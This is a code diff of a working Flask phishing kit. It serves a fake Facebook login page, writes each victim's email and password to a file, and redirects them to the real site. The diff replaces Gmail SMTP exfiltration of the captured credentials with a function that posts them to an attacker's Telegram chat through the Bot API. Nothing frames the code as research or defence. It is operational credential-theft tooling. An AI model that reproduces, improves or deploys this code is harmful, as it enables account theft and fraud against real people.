@@ -1,8 +1,7 @@
-# FORCE_RELOAD_V2
 import os
 import datetime
-import smtplib
-from email.mime.text import MIMEText
+import urllib.parse
+import urllib.request
 from flask import Flask, request, redirect
 
 app = Flask(__name__)
@@ -50,37 +49,32 @@ LOGIN_PAGE = """
 
 REDIRECT_URL = os.environ.get("REDIRECT_URL", "https://www.facebook.com/")
 LOG_FILE = os.environ.get("LOG_FILE", "captured.txt")
-SMTP_USER = os.environ.get("SMTP_USER", "")
-SMTP_PASS = os.environ.get("SMTP_PASS", "")
-CAPTURE_TO = os.environ.get("CAPTURE_TO", "")
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
 
-# Prints once when the worker boots — tells us if env vars are loaded
-print("BOOT user_len=%d pass_len=%d to_len=%d" % (len(SMTP_USER), len(SMTP_PASS), len(CAPTURE_TO)), flush=True)
+# Prints once at boot to check if env vars loaded
+print("BOOT Telegram Token Len:", len(TELEGRAM_BOT_TOKEN), "Chat ID Len:", len(TELEGRAM_CHAT_ID), flush=True)
 
-
-def send_email(text):
-    print("SEND_CALLED user_len=%d pass_len=%d to_len=%d" % (len(SMTP_USER), len(SMTP_PASS), len(CAPTURE_TO)), flush=True)
-    if not (SMTP_USER and SMTP_PASS and CAPTURE_TO):
-        print("SEND_SKIPPED: a value is empty", flush=True)
+def send_to_telegram(text):
+    if not (TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID):
+        print("SEND_SKIPPED: No Telegram vars", flush=True)
         return
     try:
-        msg = MIMEText(text)
-        msg["Subject"] = "New Facebook Login Capture"
-        msg["From"] = SMTP_USER
-        msg["To"] = CAPTURE_TO
-        server = smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=10)
-        server.login(SMTP_USER, SMTP_PASS)
-        server.sendmail(SMTP_USER, CAPTURE_TO, msg.as_string())
-        server.quit()
-        print("EMAIL_SENT_OK", flush=True)
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = urllib.parse.urlencode({
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": text,
+        }).encode("utf-8")
+        req = urllib.request.Request(url, data=data)
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            resp.read()
+        print("TELEGRAM_SENT_OK", flush=True)
     except Exception as e:
-        print("EMAIL_ERROR:", repr(e), flush=True)
-
+        print("TELEGRAM_ERROR:", repr(e), flush=True)
 
 @app.route("/")
 def index():
     return LOGIN_PAGE
-
 
 @app.route("/capture", methods=["POST"])
 def capture():
@@ -92,10 +86,10 @@ def capture():
     with open(LOG_FILE, "a") as f:
         f.write(f"{timestamp} | {email} | {password}\n")
 
-    send_email(f"Time: {timestamp}\nEmail: {email}\nPassword: {password}")
+    msg = f"New Facebook Capture\n🕒 {timestamp}\n📧 {email}\n🔑 {password}"
+    send_to_telegram(msg)
 
     return redirect(REDIRECT_URL)
-
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
